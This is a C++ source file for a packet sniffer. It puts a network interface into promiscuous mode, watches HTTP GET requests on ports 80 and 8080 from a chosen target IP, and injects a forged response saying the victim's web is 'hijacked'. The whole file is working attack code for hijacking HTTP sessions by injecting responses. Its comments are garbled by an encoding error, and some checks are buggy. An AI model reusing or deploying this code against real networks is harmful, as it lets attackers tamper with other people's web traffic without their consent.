#include "packet_sniffer.h"
#include <sys/types.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <string.h>
#include "httpfake.h"
#include "http_parse.h"

#ifdef _ENABLE_PCAP
#include <pcap.h>
#endif

#define BUF_LEN (2048)


#ifndef ETHERTYPE_VLAN
#define ETHERTYPE_VLAN          0x8100
#endif
#ifndef VALUE_GET
#define VALUE_GET				0x47455420
#endif


// �ٳ���Ӧ
static char *g_Response = "<html>"
                          "<head><title>���ز���</title></head>"
                          "<body><h1>You web is hijacked, Haha</h1></body>"
                          "</html>";




///
PacketSniffer::PacketSniffer()
{
    mParser = new HttpParse();
    if( mParser == NULL )
    {
        fprintf( stderr, "Init httpparse error" );
        exit( 1 );
    }

    mFaker = new HttpFake();
    if( mParser == NULL )
    {
        fprintf( stderr, "Init httpparse error" );
        exit( 1 );
    }
}



PacketSniffer::~PacketSniffer()
{
    if( mParser )
    {
        delete mParser;
        mParser = NULL;
    }

    if( mFaker )
    {
        delete mFaker;
        mFaker = NULL;
    }
}




void PacketSniffer::Start( char *eth, int type, char *ip )
{
    inet_pton( AF_INET, ip, &m_PreventIp );

    // �ɼ�����
    if( type == 1 )
    {
        printf( "Enable raw socket\n" );

        this->RawSniffer( eth );
    }
    else if( type == 2 )
    {
        printf( "Enable libpcap\n" );

        this->PcapSniffer( eth );
    }
}



void PacketSniffer::HandleFrame( char *pdata )
{
    if( pdata == NULL )
        return;

    struct ethhdr *pe;
    struct iphdr *iphead;
    struct tcphdr *tcp;

    char *Data = NULL;
    unsigned int Length = 0;

    URLInfo host = {};
    int offset = 0;

    pe = (struct ethhdr*)pdata;

    /// vlan
    if( ntohs(pe->h_proto) == ETHERTYPE_VLAN )       // vlan
    {
        offset = 4;
    }
    else if( ntohs(pe->h_proto) != ETHERTYPE_IP )    // ip
    {
        return;
    }

    /// ip
    iphead = (struct iphdr*)( pdata + offset + sizeof(struct ethhdr) );
    if( NULL == iphead )
    {
        return;
    }

    if( iphead->protocol != IPPROTO_TCP )
    {
        return;
    }

    /// tcp
    tcp = (struct tcphdr*)((char*)iphead + sizeof(struct ip));
    if( NULL == tcp )
    {
        return;
    }

    /// 80+8080
    if( (ntohs(tcp->dest) != 80)
            && (ntohs(tcp->dest) != 8080) )
    {
        return;
    }

    Length = htons(iphead->tot_len) - iphead->ihl*4 - tcp->doff*4;
    if( Length < 20 || Length > 3000 )
    {
        return;
    }

    Data = (char*)tcp + sizeof(struct tcphdr);

    /// GET����
    if( ntohl(*(unsigned int*)Data) != VALUE_GET)
    {
        return;
    }

    // ����������
    if( !mParser->parseHttp(Data,Length,&host) )
    {
        return;
    }

    /// ������ʾ��ֻ����ָ��IP��������Ϊ*.htm������
    if( iphead->saddr == m_PreventIp )
    {
        printf( "IP:%u %s/%s plen:%d\n",iphead->saddr,host.host,host.path, host.plen );

        /// ������path����Ϊ25������
        if( host.plen == 25 )
        {
            // α����Ӧ
            mFaker->sendHttpResponse( (char*)iphead, g_Response );
        }
    }
}



void PacketSniffer::RawSniffer( const char *ethn )
{
    int n;
    char buffer[BUF_LEN];

    int sock = socket(PF_PACKET,SOCK_RAW,htons(ETH_P_IP));
    assert(sock!=-1);

    // nic=eth0
    struct ifreq ifr;
    strcpy( ifr.ifr_name, ethn );
    ioctl( sock, SIOCGIFFLAGS, &ifr );

    // promisc
    ifr.ifr_flags |= IFF_PROMISC;
    ioctl(sock,SIOCGIFFLAGS,&ifr);

    while( 1 )
    {
        bzero( buffer, BUF_LEN );
        n = recvfrom( sock, buffer, BUF_LEN, 0, NULL, NULL );

        // �ص�����
        this->HandleFrame( buffer );
    }

    close(sock);
}



#ifdef _ENABLE_PCAP

// Libpcap�ص�����
void GetPacket( u_char *arg, const struct pcap_pkthdr*, const u_char *packet )
{
    PacketSniffer *pSniffer = (PacketSniffer*)arg;
    pSniffer->HandleFrame( (char*)packet );
}

#endif // _ENABLE_PCAP



void PacketSniffer::PcapSniffer( char *eth )
{
#ifdef _ENABLE_PCAP
    char errBuf[1024];
    pcap_t *device = pcap_open_live( eth, 65535, 1, 0, errBuf );
    if(!device)
    {
        printf( "ERROR: open pcap %s\n", errBuf );
        exit(1);
    }

    pcap_loop( device, -1, GetPacket, (u_char*)this );
#endif // _ENABLE_PCAP
}


